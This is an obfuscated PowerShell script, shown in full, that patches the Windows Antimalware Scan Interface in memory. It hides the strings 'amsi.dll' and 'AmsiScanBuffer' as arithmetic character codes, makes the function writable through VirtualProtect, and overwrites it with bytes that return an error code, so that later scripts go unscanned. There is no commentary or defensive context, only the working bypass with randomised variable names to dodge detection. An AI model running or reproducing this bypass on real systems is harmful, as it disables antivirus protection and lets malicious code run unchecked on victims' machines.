$roo = @"
using System;
using System.Runtime.InteropServices;
public class roo {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Lh9779IRrJ, string N09n_cxTleaIbC8);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr bkhsJwfAW0yR, UIntPtr KeA99JkFD, uint kz_feu7Mzb4Lvscwq, out uint Yx2fOtuE7oW);
}
"@

Add-Type $roo

$drZXH8Io6O = [roo]::LoadLibrary("$([CHAR]([bYTE]0x61)+[char]([BytE]0x6d)+[chaR]([BytE]0x73)+[cHaR](105*33/33)+[CHar](30+16)+[cHAr](100*47/47)+[cHAr]([BytE]0x6c)+[cHar](108+75-75))")
$eI4UJ92T_Np9gspRZ5 = [roo]::GetProcAddress($drZXH8Io6O, "$([CHAR]([bYtE]0x41)+[chAR](30+79)+[CHar]([bYtE]0x73)+[ChAr](105)+[CHar]([bytE]0x53)+[chAr]([byTe]0x63)+[ChAr](50+47)+[Char]([ByTe]0x6e)+[CHAr](42+24)+[cHar](102+15)+[char](102*56/56)+[ChAR](102+68-68)+[chaR]([ByTE]0x65)+[ChAr](33+81))")
$p = 0
[roo]::VirtualProtect($eI4UJ92T_Np9gspRZ5, [uint32]5, 0x40, [ref]$p)
$Flzg = "0xB8"
$LpbUY75UTMW06Bt = "0x57"
$BdJwhD1yhOh8rj = "0x00"
$Jw3bOLptMUJ1OnIglyWC = "0x07"
$S4EY_3z = "0x80"
$w9V1UnRfkb5TN0_eKTs = "0xC3"
$MyrO = [Byte[]] ($Flzg,$LpbUY75UTMW06Bt,$BdJwhD1yhOh8rj,$Jw3bOLptMUJ1OnIglyWC,+$S4EY_3z,+$w9V1UnRfkb5TN0_eKTs)
[System.Runtime.InteropServices.Marshal]::Copy($MyrO, 0, $eI4UJ92T_Np9gspRZ5, 6)